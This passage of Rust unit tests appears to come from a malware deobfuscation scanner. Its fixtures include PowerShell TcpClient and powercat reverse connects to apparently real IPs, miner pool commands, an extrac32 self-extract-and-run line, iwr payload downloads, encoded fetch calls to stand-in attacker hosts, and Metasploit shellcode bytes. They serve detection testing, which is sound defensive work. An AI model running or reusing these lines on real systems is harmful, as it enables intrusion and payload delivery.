        // 172.32.x.x is PUBLIC.
        assert!(!is_noise_ip("http://172.32.0.1/x"));
    }

    #[test]
    fn github_static_assets_are_noise_but_raw_repo_urls_are_not() {
        assert!(super::is_noise_url(
            "https://github.githubassets.com/assets/light.css"
        ));
        assert!(super::is_noise_url("https://github.githubassets.com"));
        assert!(super::is_noise_url(
            "https://avatars.githubusercontent.com/u/123?v=4"
        ));
        assert!(super::is_noise_url("https://github.com/features/actions"));
        assert!(!super::is_noise_url(
            "https://github.com/acme/dropper/raw/refs/heads/main/payload.bat"
        ));
    }

    #[test]
    fn certificate_metadata_urls_are_noise() {
        assert!(super::is_noise_url("http://www.microsoft.com/exporting"));
        assert!(super::is_noise_url(
            "http://www.microsoft.com/pki/certs/MicrosoftTimeStampPCA.crt0"
        ));
        assert!(super::is_noise_url("http://www.sysinternals.com"));
        assert!(super::is_noise_url("https://www.verisign.com/rpa"));
        assert!(super::is_noise_url("http://logo.verisign.com/vslogo.gif"));
        assert!(super::is_noise_url("http://ts-ocsp.ws.symantec.com"));
        assert!(super::is_noise_url("https://d.symcb.com/cps"));
        assert!(super::is_noise_url("http://www.usertrust.com1"));
        assert!(super::is_noise_url("http://ocsp2.globalsign.com/rootr306"));
        assert!(super::is_noise_url(
            "https://www.globalsign.com/repository/0"
        ));
        assert!(super::is_noise_url(
            "http://secure.globalsign.com/cacert/gstimestampingsha2g2.crt0"
        ));
    }

    #[test]
    fn xmp_and_stock_metadata_urls_are_noise() {
        assert!(super::is_noise_url(
            "http://iptc.org/std/Iptc4xmpCore/1.0/xmlns/"
        ));
        assert!(super::is_noise_url("http://xmp.gettyimages.com/gift/1.0/"));
        assert!(super::is_noise_url("http://ns.useplus.org/ldf/xmp/1.0/"));
        assert!(super::is_noise_url(
            "https://www.istockphoto.com/photo/license-gm1721592530-"
        ));
        assert!(super::is_noise_url(
            "http://www.apache.org/licenses/LICENSE-2.0\\par"
        ));
        assert!(super::is_noise_url(
            "http://www.red-gate.com/products/dotnet-development/smartassembly/?utm_source=x"
        ));
        assert!(super::is_noise_url("http://sawebservice.red-gate.com/"));
        assert!(super::is_noise_url(
            "http://www.smartassembly.com/webservices/Reporting/UploadReport2"
        ));
        assert!(super::is_noise_url("http://www.aiim.org/pdfa/ns/id/"));
        assert!(super::is_noise_url(
            "http://schemas.openxmlformats.org/markup-compatibility/2006"
        ));
        assert!(super::is_noise_url("http://www.iec.ch"));
        assert!(super::is_noise_url(
            "http://commons.wikimedia.org/wiki/File:Case_miditower.jpg"
        ));
        assert!(super::is_noise_url(
            "https://www.chiark.greenend.org.uk/~sgtatham/putty/0"
        ));
        assert!(super::is_noise_url(
            "http://tempuri.org/Database1DataSet.xsd"
        ));
        assert!(super::is_noise_url("https://www.autoitscript.com/autoit3/"));
    }

    #[test]
    fn binary_resource_template_urls_are_noise() {
        assert!(super::is_noise_url("https://www.youtube.com/embed/"));
        assert!(super::is_noise_url("https://player.vimeo.com/video/"));
        assert!(super::is_noise_url("https://ok.ru/videoembed/"));
        assert!(super::is_noise_url(
            "https://music.yandex.ru/iframe/#track/"
        ));
        assert!(super::is_noise_url("https://www.google.com/maps/place/"));
        assert!(super::is_noise_url("https://www.cyotek.com"));
        assert!(super::is_noise_url("http://sourceforge.net/p/compactview"));
        assert!(super::is_noise_url("http://www.skinstudio.netG"));
    }

    #[test]
    fn malformed_binary_urls_are_noise() {
        assert!(super::is_noise_url(
            "http://ts-ocsp.ws.symantec.com07\u{6}\u{8}"
        ));
        assert!(super::is_noise_url("http://example.com/path\u{fffd}tail"));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_var_socket_connect_tests {
    use super::scan_ps_var_socket_connect;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn connects(script: &str) -> Vec<(String, u16)> {
        let mut env = Environment::new(&Config::default());
        scan_ps_var_socket_connect(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::RemoteConnect { host, port, .. } => Some((host, port)),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn ip_and_port_vars_with_tcpclient_emit_remoteconnect() {
        // b087e1309f3eab63… corpus shape — top-of-script IP + port
        // literals, TcpClient further down with variable args.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $dport = 443
            $rc4 = New-Object byte[] 256
            $client = New-Object System.Net.Sockets.TcpClient($ip, $newport)
        "#;
        assert_eq!(connects(s), vec![("85.239.61.60".to_string(), 443)]);
    }

    #[test]
    fn private_ip_not_emitted() {
        // RFC1918 / loopback shouldn't fire — not real C2.
        let s = r#"
            $ipaddress = '192.168.1.100'
            $dport = 8080
            New-Object Net.Sockets.TcpClient($ip, $port)
        "#;
        assert!(connects(s).is_empty());
    }

    #[test]
    fn no_socket_use_no_emit() {
        // IP + port literals without any socket/network primitive
        // shouldn't fire — could be a config var unrelated to C2.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $dport = 443
            Write-Host "config loaded"
        "#;
        assert!(connects(s).is_empty());
    }

    #[test]
    fn power_of_two_port_lookalikes_skipped() {
        // 256/1024/2048/4096 are usually buffer sizes, not C2 ports.
        // When the only port-named var is a power-of-2, we skip the
        // pair rather than emitting a false-positive.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $newport = 256
            New-Object Net.Sockets.TcpClient($ip, $port)
        "#;
        assert!(connects(s).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod extrac32_self_extract_tests {
    use super::scan_extrac32_self_extract;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn traits_of(script: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_extrac32_self_extract(script, &mut env);
        env.traits
    }

    #[test]
    fn bat_cab_dual_detonation_self_reference_detected() {
        // PO#5_tower_Dec162024.cmd corpus shape — bat/CAB polyglot
        // whose batch payload (hidden inside the CAB header) is
        // `extrac32 /y "%~f0" "%tmp%\x.exe" && start "" …`.
        let line = r#"cls && extrac32 /y "%~f0" "%tmp%\x.exe" && start "" "%tmp%\x.exe""#;
        let ts = traits_of(line);
        let has_extrac32 = ts.iter().any(|t| {
            matches!(
                t,
                Trait::Extrac32 { src, dst, self_reference }
                    if src == "%~f0" && dst == "%tmp%\\x.exe" && *self_reference
            )
        });
        assert!(has_extrac32, "no Extrac32 trait: {:?}", ts);
        let has_self_extract = ts.iter().any(|t| {
            matches!(
                t,
                Trait::SelfExtract { method } if method == "extrac32-self-cab"
            )
        });
        assert!(has_self_extract, "no SelfExtract trait: {:?}", ts);
    }

    #[test]
    fn extrac32_with_explicit_src_is_not_self_reference() {
        let line = r#"extrac32 /y "C:\Windows\System32\msi.cab" "C:\Users\Public\out.msi""#;
        let ts = traits_of(line);
        let extrac = ts.iter().find_map(|t| match t {
            Trait::Extrac32 {
                src,
                dst,
                self_reference,
            } => Some((src.clone(), dst.clone(), *self_reference)),
            _ => None,
        });
        assert_eq!(
            extrac,
            Some((
                "C:\\Windows\\System32\\msi.cab".to_string(),
                "C:\\Users\\Public\\out.msi".to_string(),
                false,
            ))
        );
    }

    #[test]
    fn extrac32_handler_dedup_with_scanner() {
        // Both interp's h_extrac32 and our scanner would emit Extrac32
        // for the same line — verify we don't double-emit.
        let line = r#"extrac32 /y "%~f0" "%tmp%\x.exe""#;
        let mut env = Environment::new(&Config::default());
        env.traits.push(Trait::Extrac32 {
            src: "%~f0".into(),
            dst: "%tmp%\\x.exe".into(),
            self_reference: true,
        });
        scan_extrac32_self_extract(line, &mut env);
        let extrac_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Extrac32 { .. }))
            .count();
        assert_eq!(extrac_count, 1, "double-emit: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_unescape_url_tests {
    use super::scan_js_unescape_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_js_unescape_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn pct(s: &str) -> String {
        s.bytes().map(|b| format!("%{:02X}", b)).collect()
    }

    #[test]
    fn unescape_url_encoded_blob_decodes_url() {
        // 7e2d7cede80f… JS corpus shape: `unescape('%XX%XX…')` decodes
        // to a JS body whose `targets = [...]` array hosts C2 URLs.
        let inner = "const targets = ['https://gov-cn.cloud/01Gni', 'https://gov-cn.cloud/NKB39'];";
        let script = format!("var s = unescape('{}');", pct(inner));
        let extracted = urls(&script);
        assert!(extracted.iter().any(|u| u == "https://gov-cn.cloud/01Gni"));
        assert!(extracted.iter().any(|u| u == "https://gov-cn.cloud/NKB39"));
    }

    #[test]
    fn decode_uricomponent_works_too() {
        let inner = "fetch('https://attacker-domain.example.io/beacon');";
        let script = format!("eval(decodeURIComponent('{}'));", pct(inner));
        assert!(urls(&script)
            .iter()
            .any(|u| u == "https://attacker-domain.example.io/beacon"));
    }

    #[test]
    fn decoded_url_preserves_balanced_bracket_suffix() {
        let inner = "fetch('https://attacker-domain.example.io/payload[1]');";
        let script = format!("eval(decodeURIComponent('{}'));", pct(inner));
        assert_eq!(
            urls(&script),
            vec!["https://attacker-domain.example.io/payload[1]".to_string()]
        );
    }

    #[test]
    fn u_escape_form_handled() {
        // `%uXXXX` (UTF-16 codepoint) form — used by some older JS
        // obfuscators. ASCII codepoints encode the same as `%XX`.
        let s = "var u = unescape('%u0068%u0074%u0074%u0070%u003a%u002f%u002fwww.evil-domain-test.cc/x');";
        let extracted = urls(s);
        assert!(
            extracted
                .iter()
                .any(|u| u.contains("evil-domain-test.cc/x")),
            "got {:?}",
            extracted
        );
    }

    #[test]
    fn no_url_in_decoded_text_does_not_misfire() {
        let s = format!(
            "var s = unescape('{}');",
            pct("just some random text no URL here")
        );
        assert!(urls(&s).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod js_fromcharcode_url_tests {
    use super::scan_js_fromcharcode_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_js_fromcharcode_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn fcc(s: &str) -> String {
        s.bytes()
            .map(|b| format!("{},", b))
            .collect::<String>()
            .trim_end_matches(',')
            .to_string()
    }

    #[test]
    fn single_fromcharcode_decodes_url() {
        // eszja_1.3.41.js corpus shape — `String.fromCharCode(104,116,116,…)`.
        let url = "https://nav.domains/fall_back";
        let script = format!("var u = String.fromCharCode({});", fcc(url));
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn fromcharcode_url_preserves_balanced_bracket_suffix() {
        let url = "https://nav.domains/payload[1]";
        let script = format!("var u = String.fromCharCode({});", fcc(url));
        let extracted = urls(&script);
        assert_eq!(extracted, vec![url.to_string()]);
    }

    #[test]
    fn concatenated_fromcharcode_chains_decode_as_one_string() {
        // `String.fromCharCode(…) + String.fromCharCode(…)` style splits
        // the URL across two calls — common JS-packer evasion.
        let a = "https://attacker-c2.example-evil-domain.io/";
        let b = "panel/login.php";
        let script = format!(
            "var u = String.fromCharCode({}) + String.fromCharCode({});",
            fcc(a),
            fcc(b)
        );
        let extracted = urls(&script);
        assert!(
            extracted.iter().any(|u| u.contains("panel/login.php")),
            "expected concatenated URL; got {:?}",
            extracted
        );
    }

    #[test]
    fn fromcharcode_without_url_does_not_misfire() {
        // Plain text "Hello, World!" — no URL, no trait.
        let script = format!("var s = String.fromCharCode({});", fcc("Hello, World!"));
        assert!(urls(&script).is_empty());
    }

    #[test]
    fn malformed_numbers_skipped_silently() {
        // Non-digit garbage between commas — should not crash.
        let script = r#"var x = String.fromCharCode(72, abc, 105);"#;
        let _ = urls(script); // smoke test
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_tcp_client_tests {
    use super::scan_remote_connects;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn connects(script: &str) -> Vec<(String, u16)> {
        let mut env = Environment::new(&Config::default());
        scan_remote_connects(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::RemoteConnect { host, port, .. } => Some((host, port)),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn ps_tcp_client_ip_port_paren_form() {
        // st.ps1 corpus shape — `New-Object Net.Sockets.TcpClient("ip", port)`.
        let s = r#"$c = New-Object Net.Sockets.TcpClient("45.82.69.203", 443);"#;
        assert_eq!(connects(s), vec![("45.82.69.203".to_string(), 443)]);
    }

    #[test]
    fn ps_tcp_client_system_prefix_works() {
        // `New-Object System.Net.Sockets.TcpClient(...)` form.
        let s = r#"New-Object System.Net.Sockets.TcpClient("c2.evil.com", 8080)"#;
        assert_eq!(connects(s), vec![("c2.evil.com".to_string(), 8080)]);
    }

    #[test]
    fn ps_tcp_client_argumentlist_flag_form() {
        let s = r#"New-Object Net.Sockets.TcpClient -ArgumentList '10.0.0.5', 4444"#;
        assert_eq!(connects(s), vec![("10.0.0.5".to_string(), 4444)]);
    }

    #[test]
    fn powercat_reverse_connect_ip_port_flags() {
        let s = r#"powercat -c 45.82.69.203 -p 2080 -ep"#;
        assert_eq!(connects(s), vec![("45.82.69.203".to_string(), 2080)]);
    }

    #[test]
    fn powercat_reverse_connect_port_ip_flags() {
        let s = r#"powercat -p 2080 -c c2.evil.com -ep"#;
        assert_eq!(connects(s), vec![("c2.evil.com".to_string(), 2080)]);
    }

    #[test]
    fn miner_stratum_server_flag_emits_remote_connect() {
        let s = r#"miner.exe --proto stratum --algo etchash --server etchash.infinityton.com:4445 --user wallet.worker"#;
        assert_eq!(
            connects(s),
            vec![("etchash.infinityton.com".to_string(), 4445)]
        );
    }

    #[test]
    fn xmrig_pool_output_flag_emits_remote_connect() {
        let s = r#"xmrig.exe -a gr -o raptoreumemporium.com:3008 -u wallet -p x"#;
        assert_eq!(
            connects(s),
            vec![("raptoreumemporium.com".to_string(), 3008)]
        );
    }

    #[test]
    fn commented_miner_pool_example_does_not_emit_remote_connect() {
        let s = r#":: xmrig.exe -a gr -o example.com:3333 -u wallet"#;
        assert!(connects(s).is_empty());
    }

    #[test]
    fn ps_tcp_client_with_variable_args_does_not_fire() {
        // 13 corpus samples use `$ip, $port` — no literal host/port to
        // capture. We don't emit RemoteConnect for those (no signal to
        // give without runtime values).
        let s = r#"New-Object System.Net.Sockets.TcpClient($ip, $port)"#;
        assert!(connects(s).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_char_index_extractor_tests {
    use super::{has_ps_char_index_extractor_atom, scan_ps_char_index_extractor_urls};
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_ps_char_index_extractor_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    fn traits(script: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_ps_char_index_extractor_urls(script, &mut env);
        env.traits
    }

    fn pad_extracted(decoded: &str) -> String {
        decoded.chars().flat_map(|ch| ['x', ch]).collect::<String>()
    }

    #[test]
    fn musculos_style_extractor_unlocks_url() {
        // 订单列表.bat family — function takes a noise-padded string and
        // extracts chars at indices 3, 7, 11, … (start=3, step=4).
        let script = r#"
            function Musculos ($filmprod){
                $overill=3;
                do { $sirp+=$filmprod[$overill]; $overill+=4; }
                until (!$filmprod[$overill])
                $sirp
            }
            $u = Musculos 'a.ahaaataaataaapaaasaaa:aaa/ aa/aa saaahaaaaaaal a oaa u a.x aataaa.aaata ao.aapaaa/aaaBaaaoaaataa taaa1aaa7aaa4aaa.aaam aad a p'
        "#;
        let extracted = urls(script);
        assert!(
            extracted
                .iter()
                .any(|u| u == "https://shalouxt.top/Bott174.mdp"),
            "expected shalouxt.top URL; got {:?}",
            extracted
        );
    }

    #[test]
    fn extractor_download_context_promotes_url_to_download() {
        let url = "https://ps-char-context.example/stage.bin";
        let download_call = "$wc.DownloadFile($url,$dst)";
        let script = format!(
            r#"
            function Pick ($p){{
                $i=1;
                do {{ $r+=$p[$i]; $i+=2; $noise=Compare-Object alpha beta; }}
                until (!$p[$i])
                $r
            }}
            $url = Pick '{}'
            Pick '{}'
        "#,
            pad_extracted(url),
            pad_extracted(download_call)
        );

        let traits = traits(&script);
        assert!(
            traits.iter().any(|t| matches!(t,
                Trait::Download { src, .. } if src == url
            )),
            "expected structured Download from decoded download context; got {:?}",
            traits
        );
        assert!(
            !traits.iter().any(|t| matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == url
            )),
            "decoded download context should not leave only a generic URL trait: {:?}",
            traits
        );
    }

    #[test]
    fn prefilter_allows_index_extractor_shape() {
        let script = r#"
            function Musculos ($filmprod){
                $overill=3;
                do { $sirp+=$filmprod[$overill]; $overill+=4; }
                until (!$filmprod[$overill])
                $sirp
            }
        "#;

        assert!(has_ps_char_index_extractor_atom(script));
    }

    #[test]
    fn prefilter_blocks_function_without_index_extraction() {
        let script = r#"
            function Sum ($n){ $i=0; do { $s+=1; $i+=1 } until ($i -ge $n) $s }
            $x = Sum 5
        "#;

        assert!(!has_ps_char_index_extractor_atom(script));
    }

    #[test]
    fn prefilter_blocks_index_math_without_do_until_extractor_loop() {
        let script = r#"
            function MaybeIndexer ($p){
                $i=3;
                $r += $p[$i];
                $i += 4;
                $r
            }
        "#;

        assert!(!has_ps_char_index_extractor_atom(script));
    }

    #[test]
    fn extractor_with_start_2_step_3() {
        // Variant with different start/step — make sure we don't hardcode.
        // String: `aaXbbYccZddH`, start=2, step=3 → X, Y, Z, H = "XYZH"
        // (not a URL, so just verify the scanner runs without crashing).
        let script = r#"
            function Foo ($p){
                $i=2; do { $r+=$p[$i]; $i+=3 } until (!$p[$i]) $r
            }
            $x = Foo 'aaXbbYccZddH'
        "#;
        let _ = urls(script); // no URL expected; just smoke-test
    }

    #[test]
    fn function_without_index_indirection_does_not_misfire() {
        // A function that just iterates without indexing should NOT
        // register as an extractor.
        let script = r#"
            function Sum ($n){ $i=0; do { $s+=1; $i+=1 } until ($i -ge $n) $s }
            $x = Sum 5
        "#;
        assert!(urls(script).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_bare_url_download_tests {
    use super::{has_ps_bare_url_download_atom, scan_ps_bare_url_downloads};
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_ps_bare_url_downloads(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn iwr_uri_bare_host_synthesizes_http_prefix() {
        // document.vbs / test1.vbs corpus shape.
        let s = r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#;
        assert_eq!(urls(s), vec!["http://rebrand.ly/47i82k6".to_string()]);
    }

    #[test]
    fn iwr_short_uri_bare_host_synthesizes_http_prefix() {
        let s = r#"iwr -Ur 'rebrand.ly/shorturi' -OutFile $env:TEMP\f.exe"#;
        assert_eq!(urls(s), vec!["http://rebrand.ly/shorturi".to_string()]);
    }

    #[test]
    fn iwr_colon_bound_short_uri_bare_host_synthesizes_http_prefix() {
        let s = r#"iwr -Ur:'rebrand.ly/colonuri' -OutFile $env:TEMP\f.exe"#;
        assert_eq!(urls(s), vec!["http://rebrand.ly/colonuri".to_string()]);
    }

    #[test]
    fn start_process_bare_host_synthesizes_http_prefix() {
        // MICROSOFT_OFFICE_EXCEL_A.vbs corpus shape.
        let s = r#"Start-Process 'goingupdate.com/ptoleqco'"#;
        assert_eq!(urls(s), vec!["http://goingupdate.com/ptoleqco".to_string()]);
    }

    #[test]
    fn invoke_restmethod_bare_host_works_too() {
        let s = r#"Invoke-RestMethod 'evil-c2.io/beacon'"#;
        assert_eq!(urls(s), vec!["http://evil-c2.io/beacon".to_string()]);
    }

    #[test]
    fn quoted_bare_host_without_path_still_synthesizes_http_prefix() {
        let s = r#"Start-Process 'evil-c2.io'"#;
        assert_eq!(urls(s), vec!["http://evil-c2.io".to_string()]);
    }

    #[test]
    fn prefilter_allows_supported_quoted_ps_download_invocations() {
        assert!(has_ps_bare_url_download_atom(
            r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#
        ));
        assert!(has_ps_bare_url_download_atom(
            r#"Start-Process "goingupdate.com/ptoleqco""#
        ));
        assert!(has_ps_bare_url_download_atom(
            r#"Invoke-RestMethod 'evil-c2.io/beacon'"#
        ));
    }

    #[test]
    fn prefilter_blocks_generic_dotted_powershell_text() {
        assert!(!has_ps_bare_url_download_atom(
            r#"$s = New-Object -ComObject 'Wscript.Shell'"#
        ));
        assert!(!has_ps_bare_url_download_atom(
            r#"Start-Process microsoft.com"#
        ));
    }

    #[test]
    fn comobject_wscript_shell_does_not_misfire() {
        // The whole point of the TLD allowlist — `Wscript.Shell`,
        // `Script.Shell`, `Net.WebClient` etc. must NOT be treated as
        // bare URLs even though they have a dot.
        let s = r#"$s = New-Object -ComObject 'Wscript.Shell'"#;
        assert!(urls(s).is_empty(), "false positive on Wscript.Shell");
        let s2 = r#"Start-Process Script.Shell"#;
        assert!(urls(s2).is_empty(), "false positive on Script.Shell");
    }

    #[test]
    fn no_quotes_around_host_does_not_misfire() {
        // The regex requires quotes — `start microsoft.com` could be a
        // bare arg list but is too risky without quotes.
        let s = r#"Start-Process microsoft.com"#;
        assert!(urls(s).is_empty(), "should require quotes");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_replace_chain_url_prefilter_tests {
    use super::has_ps_replace_chain_url_atom;

    #[test]
    fn prefilter_allows_replace_chain_url_markers() {
        assert!(has_ps_replace_chain_url_atom(
            r#"$u='htxp://evil.example/p'; $u=$u.Replace('x','t')"#
        ));
        assert!(has_ps_replace_chain_url_atom(
            r#"$u='quwdevil.example/p'; $u=$u -replace 'quwd','https://'"#
        ));
    }

    #[test]
    fn prefilter_blocks_replace_without_url_template() {
        assert!(!has_ps_replace_chain_url_atom(
            r#"$name = $name.Replace('a','b')"#
        ));
        assert!(!has_ps_replace_chain_url_atom(
            r#"Write-Host 'hxxp://example.invalid/no-replace-call'"#
        ));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod inline_b64_url_extraction_tests {
    use super::scan_inline_b64_urls;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;
    use base64::Engine;

    fn urls(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_inline_b64_urls(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn b64_decoded_ps_body_urls_surface() {
        // Data.ps1 family: the whole script is a single
        // `[Convert]::FromBase64String('<b64>')` that decodes to a PS body
        // containing several URLs. We should surface each URL even though
        // the decoded text does NOT start with `http://`.
        let body = r#"$Urls = @{ "a" = "https://github.com/lee-willie/Data/raw/refs/heads/main/Start.vbs" }"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(body);
        let script = format!("$e = [System.Convert]::FromBase64String('{b64}')");
        let extracted = urls(&script);
        assert!(
            extracted
                .iter()
                .any(|u| u.contains("github.com/lee-willie/Data/raw/refs/heads/main/Start.vbs")),
            "expected github URL, got {:?}",
            extracted
        );
    }

    #[test]
    fn b64_decoded_bare_url_still_surfaces() {
        // Bare-URL fast path — preserves prior behaviour.
        let b64 = base64::engine::general_purpose::STANDARD
            .encode("https://attacker-example.org/payload.exe");
        let script = format!("[Convert]::FromBase64String('{b64}')");
        let extracted = urls(&script);
        assert_eq!(
            extracted,
            vec!["https://attacker-example.org/payload.exe".to_string()]
        );
    }

    #[test]
    fn b64_decoded_garbage_does_not_misfire() {
        // Random bytes shouldn't yield a URL.
        let b64 = base64::engine::general_purpose::STANDARD.encode([0u8; 32]);
        let script = format!("[Convert]::FromBase64String('{b64}')");
        assert!(urls(&script).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod shellcode_marker_tests {
    use super::{has_shellcode_marker_atom, scan_shellcode_marker};
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn evidences(script: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        scan_shellcode_marker(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::ShellcodeMarker { evidence } => Some(evidence),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn prefilter_allows_shellcode_marker_shapes() {
        for sample in [
            r#"$shellCode = @(0x41,0x42)"#,
            r#"$buf = "A" + "\x90\x90\x90\x90\x90\x90\x90\x90""#,
            r#"$buf = 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90"#,
            r#"[Byte[]] $BqFIleukW = 0xfc,0x48,0x83,0xe4,0xf0"#,
            r#"[Byte[]] $sc = 0XFC,0XE8,0x82"#,
        ] {
            assert!(has_shellcode_marker_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_hex_and_powershell_text() {
        assert!(!has_shellcode_marker_atom(
            r#"$bytes = 0x41,0x42,0x43; Write-Host done"#,
        ));
        assert!(!has_shellcode_marker_atom("powershell -nop -w hidden"));
    }

    #[test]
    fn msf_x64_prologue_detected() {
        // meter.ps1 family: classic `cld; sub rsp, 0xf0` x64 prologue.
        let s = r#"[Byte[]] $BqFIleukW = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0"#;
        assert!(evidences(s).contains(&"msf-x64-prologue".to_string()));
    }

    #[test]
    fn msf_x86_prologue_detected() {
        // 32-bit Metasploit `cld; call <next>` GetEIP prologue.
        let s = r#"[Byte[]] $sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89"#;
        assert!(evidences(s).contains(&"msf-x86-prologue".to_string()));
    }

    #[test]
    fn lone_0xfc_e8_outside_byte_array_does_not_misfire() {
        // The bytes `0xfc, 0xe8` could appear in any other byte array
        // (e.g. AES round-key blob). Require the `[Byte[]] $x = …` wrap.
        let s = r#"$key = 0xfc, 0xe8, 0x10, 0x20"#;
        assert!(!evidences(s).iter().any(|e| e.starts_with("msf-")));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod url_obfuscation_collapse_tests {
    use super::normalize_url_obfuscation;

    #[test]
    fn empty_quote_pair_splice_collapses() {
        // NEW-DRAWING-SHEET.bat: `start "" "https://raw.githubuserc""o""ntent.c""o""m/.../DOC.zip"`
        assert_eq!(
            normalize_url_obfuscation(
                "https://raw.githubuserc\"\"o\"\"ntent.c\"\"o\"\"m/knkbkk212/main/DOC.zip"
            ),
            "https://raw.githubusercontent.com/knkbkk212/main/DOC.zip"
        );
    }

    #[test]
    fn url_without_quote_obfuscation_is_unchanged() {
        // Common case fast-path: don't allocate when there's nothing to do.
        let url = "https://example.com/path?q=1";
        assert_eq!(normalize_url_obfuscation(url), url);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod webdav_url_tests {
    use super::unc_webdav_to_http_url;

    #[test]
    fn ip_port_davwwwroot_to_http() {
        let url = unc_webdav_to_http_url(
            "45.9.74.36",
            "8888",
            "\\\\45.9.74.36@8888\\davwwwroot\\28618396929411.dll",
        );
        assert_eq!(url, "http://45.9.74.36:8888/28618396929411.dll");
    }

    #[test]
    fn ssl_no_port_to_https() {
        let url = unc_webdav_to_http_url(
            "stays-recipes.trycloudflare.com",
            "SSL",
            "\\\\stays-recipes.trycloudflare.com@SSL\\DavWWWRoot",
        );
        assert_eq!(url, "https://stays-recipes.trycloudflare.com");
    }

    #[test]
    fn ssl_with_trailing_file_to_https() {
        let url = unc_webdav_to_http_url(
            "host.example.com",
            "SSL",
            "\\\\host.example.com@SSL\\DavWWWRoot\\loader.bat",
        );
        assert_eq!(url, "https://host.example.com/loader.bat");
    }

    #[test]
    fn non_davwwwroot_share_kept_as_path_segment() {
        let url = unc_webdav_to_http_url("10.0.0.5", "8080", "\\\\10.0.0.5@8080\\public\\file.exe");
        assert_eq!(url, "http://10.0.0.5:8080/public/file.exe");
    }

    #[test]
    fn default_ports_dropped_from_url() {
        assert_eq!(
            unc_webdav_to_http_url("h", "80", "\\\\h@80\\davwwwroot"),
            "http://h"
        );
        assert_eq!(
            unc_webdav_to_http_url("h", "443", "\\\\h@443\\davwwwroot"),
            "http://h"
        );
    }

    #[test]
    fn nested_path_preserved() {
        let url = unc_webdav_to_http_url("h", "8888", "\\\\h@8888\\davwwwroot\\a\\b\\c.dll");
        assert_eq!(url, "http://h:8888/a/b/c.dll");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod decimal_ip_url_tests {
    use super::*;
    use crate::env::Environment;
    use crate::Config;

    fn run_and_collect_urls(deob: &str) -> Vec<String> {
